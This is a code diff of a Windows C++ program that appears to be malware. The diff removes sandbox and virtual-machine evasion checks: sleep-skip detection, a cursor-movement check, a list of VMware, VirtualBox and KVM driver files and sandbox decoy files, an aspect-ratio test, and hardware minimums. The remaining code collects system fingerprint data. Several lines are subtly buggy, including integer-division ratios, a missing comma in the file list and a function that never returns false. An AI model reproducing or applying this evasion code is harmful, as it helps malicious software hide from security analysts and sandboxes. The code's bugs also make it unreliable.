@@ -33,87 +33,21 @@ int main()
 #ifndef debug
 
 
-    POINT position1, position2;
     int Time = 600000,Divider = rand()%10000 + 100,DividedSleep = Time/Divider;
 
     for (int j = 0; j <= Divider; j++) {
         Sleep(DividedSleep);
     }
 
-    GetCursorPos(&position1);
     DWORD PatchCheck = GetTickCount();
     
     if ((int)(PatchCheck - Tick1) < Time - 5000) {
         PatchedMe = true;
     }
 
-    GetCursorPos(&position2);
-    if ((position1.x == position2.x) && (position1.y == position2.y)) {             //make extended inactivity check for user input through GetLastInput();
-        InactiveUser = true;
-    }
-
     unsigned long ThreadId;
     CreateThread(NULL, 0, Protect, 0, 0, &ThreadId);
 
-    LPCSTR BannedFiles[] = {   //crypt em n encrypt em at runtime for 1337 h4x0r status
-        //VMWare
-          "C:\\Windows\\System32\\drivers\\vmnet.sys",
-          "C:\\Windows\\System32\\drivers\\vmmouse.sys",
-          "C:\\Windows\\System32\\drivers\\vmusb.sys",
-          "C:\\Windows\\System32\\drivers\\vm3dmp.sys",
-          "C:\\Windows\\System32\\drivers\\vmci.sys",
-          "C:\\Windows\\System32\\drivers\\vmhgfs.sys",
-          "C:\\Windows\\System32\\drivers\\vmmemctl.sys",
-          "C:\\Windows\\System32\\drivers\\vmx86.sys",
-          "C:\\Windows\\System32\\drivers\\vmrawdsk.sys",
-          "C:\\Windows\\System32\\drivers\\vmusbmouse.sys",
-          "C:\\Windows\\System32\\drivers\\vmkdb.sys",
-          "C:\\Windows\\System32\\drivers\\vmnetuserif.sys",
-          "C:\\Windows\\System32\\drivers\\vmnetadapter.sys",
-        //VirtualBox
-          "C:\\Windows\\System32\\drivers\\VBoxMouse.sys",
-          "C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
-          "C:\\Windows\\System32\\drivers\\VBoxSF.sys",
-          "C:\\Windows\\System32\\drivers\\VBoxVideo.sys",
-          "C:\\Windows\\System32\\vboxdisp.dll",
-          "C:\\Windows\\System32\\vboxhook.dll",
-          "C:\\Windows\\System32\\vboxmrxnp.dll",
-          "C:\\Windows\\System32\\vboxogl.dll",
-          "C:\\Windows\\System32\\vboxoglarrayspu.dll",
-          "C:\\Windows\\System32\\vboxoglcrutil.dll",
-          "C:\\Windows\\System32\\vboxoglerrorspu.dll",
-          "C:\\Windows\\System32\\vboxoglfeedbackspu.dll",
-          "C:\\Windows\\System32\\vboxoglpackspu.dll",
-          "C:\\Windows\\System32\\vboxoglpassthroughspu.dll",
-          "C:\\Windows\\System32\\vboxservice.exe",
-          "C:\\Windows\\System32\\vboxtray.exe",
-          "C:\\Windows\\System32\\VBoxControl.exe"
-        //KVM 
-          "C:\\Windows\\System32\\drivers\\balloon.sys",
-          "C:\\Windows\\System32\\drivers\\netkvm.sys",
-          "C:\\Windows\\System32\\drivers\\pvpanic.sys",
-          "C:\\Windows\\System32\\drivers\\viofs.sys",
-          "C:\\Windows\\System32\\drivers\\viogpudo.sys",
-          "C:\\Windows\\System32\\drivers\\vioinput.sys",
-          "C:\\Windows\\System32\\drivers\\viorng.sys",
-          "C:\\Windows\\System32\\drivers\\vioscsi.sys",
-          "C:\\Windows\\System32\\drivers\\vioser.sys",
-          "C:\\Windows\\System32\\drivers\\viostor.sys",
-        //general files
-         "C:\\a\\foobar.bmp",
-         "C:\\passwords.txt",
-         "C:\\email.txt",
-         "C:\\email.htm",
-         "C:\\work.doc",
-         "C:\\work.docx",
-         "C:\\work.xls"
-    };
-
-    for (int i = 0; i < 46; i++) {                                              //deploy dynamic size thanks
-        if (fexists(BannedFiles[i])) {
-            KnownVMFile = true;
-        }
-    }
 
 #endif
 
@@ -290,7 +224,6 @@ Log:
     }
 
     int x1, y1, x2, y2, w, h, mo, mb;
-
     x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
     y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
     x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
@@ -299,94 +232,55 @@ Log:
     mb = GetSystemMetrics(SM_CMOUSEBUTTONS);
     w = x2 - x1;
     h = y2 - y1;
-
-   
-    double Ratios[6] = {4/3,16/9,21/9,32/9,16/10,5/4}; //check for monitor ratio (got this idea once i noticed heigth on my host and guest dont match, so if started in a not fullscreen VM the aspect ratio will be off)
     double Ratioed = (double)w / h;
-    bool RatioMatch = false;
-    for (int q = 0; q < 6; q++) {
-        if (Ratioed == Ratios[q]) {
-            RatioMatch = true;
-        }
-    }
-#ifndef debug
-    if (!RatioMatch) {
-        log.LogItChar("Aspect ratio doesn't match the list: probably a VM... exiting....");
-        FinalExit();
-    }
-#endif
     std::string Width = std::to_string(w);
-
     std::string Height = std::to_string(h);
-
     std::string WindowsVersion = "Unknown";
-
     std::string Monitors = std::to_string(mo);
-    
     std::string MouseButtons = std::to_string(mb);
-
     std::string BootMode = "Yes";
 
     if (GetSystemMetrics(SM_CLEANBOOT) != 0) {
         BootMode = "No";
     }
-
     std::string SlowMachine = "No";
-
     if (GetSystemMetrics(SM_SLOWMACHINE) != 0) {
         SlowMachine = "Yes";
     }
-
     std::string MiddleEast = "No";
     if (GetSystemMetrics(SM_MIDEASTENABLED) != 0) {
         MiddleEast = "Yes";
     }
-
     if (IsWindows7OrGreater())
     {
         std::string WindowsVersion = "Seven";
     }
-
     if (IsWindows7SP1OrGreater())
     {
         std::string WindowsVersion = "Seven SP1";
     }
-
     if (IsWindows8OrGreater())
     {
         std::string WindowsVersion = "Eight";
     }
-
     if (IsWindows8Point1OrGreater())
     {
         std::string WindowsVersion = "Eight.one";
     }
-
     if (IsWindows10OrGreater())
     {
         std::string WindowsVersion = "Ten";
     }
-
     if (IsWindowsServer())
     {
         std::string WindowsVersion = "Server";
     }
 
-
     SYSTEM_INFO siSysInfo;
     GetSystemInfo(&siSysInfo);
-
     MEMORYSTATUSEX RAMStatus;
     RAMStatus.dwLength = sizeof(RAMStatus);
     GlobalMemoryStatusEx(&RAMStatus);
-
-#ifndef debug
-    if (siSysInfo.dwNumberOfProcessors < RequiredCores || (RAMStatus.ullTotalPhys / 1024) / 1024 < RequiredRam) {
-        log.LogItChar("PC Specs dont match the requirements: probably a VM... exiting....");
-        FinalExit();
-    }
-#endif
-
     std::string OEMNumber = std::to_string(siSysInfo.dwOemId);
     std::string CPUCores = std::to_string(siSysInfo.dwNumberOfProcessors);
     std::string CPUType = std::to_string(siSysInfo.dwProcessorType);
@@ -867,9 +761,11 @@ std::string GetCpuInfo()
     return cpu;
 }
 
-bool fexists(const std::string& filename) {
-    std::ifstream ifile(filename.c_str());
-    return (bool)ifile;
+bool fexists(std::string filename) {
+    DWORD dwAttrib = GetFileAttributes(filename.c_str());
+
+    if(dwAttrib != INVALID_FILE_ATTRIBUTES)
+        return true;
 }
 
 void FinalExit() {
